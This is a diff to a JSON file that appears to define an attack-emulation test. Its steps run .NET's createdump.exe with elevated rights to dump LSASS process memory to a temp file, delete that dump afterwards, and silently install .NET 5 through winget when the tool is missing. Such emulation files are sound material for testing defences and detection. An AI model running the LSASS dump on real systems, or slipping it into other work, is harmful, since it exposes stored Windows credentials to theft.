@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "26e80568-32e6-412f-bd16-5eab5b556845",
+      "id": "49619435-55b5-4a52-b3da-f45923eb0d83",
       "type": "execute-command",
       "data": {
-        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n\u0026 \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n",
+        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n\u0026 \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id",
         "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "cc0f121f-e1b4-494c-a8c4-c8de67c862a1",
+      "id": "4085309c-9e5b-4357-bbba-bef8211bf659",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n",
+        "command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "fd540a73-2e7b-46ac-86e6-bb8fc8ed99fc",
+      "id": "81048648-66a1-4032-aa5d-658653c17e29",
       "name": "Check dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
       "data": {
-        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "e457e550-29ce-4f7b-a679-f831f127ad24",
+      "id": "5e377760-97cd-410b-a989-8e371459df68",
       "name": "Resolve dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
       "data": {
-        "command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n",
-        "command_type": ""
+        "command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent",
+        "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "c7c1e05b-d095-4e7a-b108-bb25be86ad81",
+      "id": "c4f2fe48-3bc6-4167-924e-c726cc0e7d33",
       "name": "Re-check dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
       "data": {
-        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "26e80568-32e6-412f-bd16-5eab5b556845",
+      "s": "49619435-55b5-4a52-b3da-f45923eb0d83",
       "p": "on-success",
-      "o": "cc0f121f-e1b4-494c-a8c4-c8de67c862a1"
+      "o": "4085309c-9e5b-4357-bbba-bef8211bf659"
     },
     {
-      "s": "26e80568-32e6-412f-bd16-5eab5b556845",
+      "s": "49619435-55b5-4a52-b3da-f45923eb0d83",
       "p": "on-failure",
-      "o": "cc0f121f-e1b4-494c-a8c4-c8de67c862a1"
+      "o": "4085309c-9e5b-4357-bbba-bef8211bf659"
     },
     {
-      "s": "fd540a73-2e7b-46ac-86e6-bb8fc8ed99fc",
+      "s": "81048648-66a1-4032-aa5d-658653c17e29",
       "p": "on-success",
-      "o": "26e80568-32e6-412f-bd16-5eab5b556845"
+      "o": "49619435-55b5-4a52-b3da-f45923eb0d83"
     },
     {
-      "s": "fd540a73-2e7b-46ac-86e6-bb8fc8ed99fc",
+      "s": "81048648-66a1-4032-aa5d-658653c17e29",
       "p": "on-failure",
-      "o": "e457e550-29ce-4f7b-a679-f831f127ad24"
+      "o": "5e377760-97cd-410b-a989-8e371459df68"
     },
     {
-      "s": "e457e550-29ce-4f7b-a679-f831f127ad24",
+      "s": "5e377760-97cd-410b-a989-8e371459df68",
       "p": "on-success",
-      "o": "c7c1e05b-d095-4e7a-b108-bb25be86ad81"
+      "o": "c4f2fe48-3bc6-4167-924e-c726cc0e7d33"
     },
     {
-      "s": "c7c1e05b-d095-4e7a-b108-bb25be86ad81",
+      "s": "c4f2fe48-3bc6-4167-924e-c726cc0e7d33",
       "p": "on-failure",
-      "o": "26e80568-32e6-412f-bd16-5eab5b556845"
+      "o": "49619435-55b5-4a52-b3da-f45923eb0d83"
     }
   ],
   "tags": [
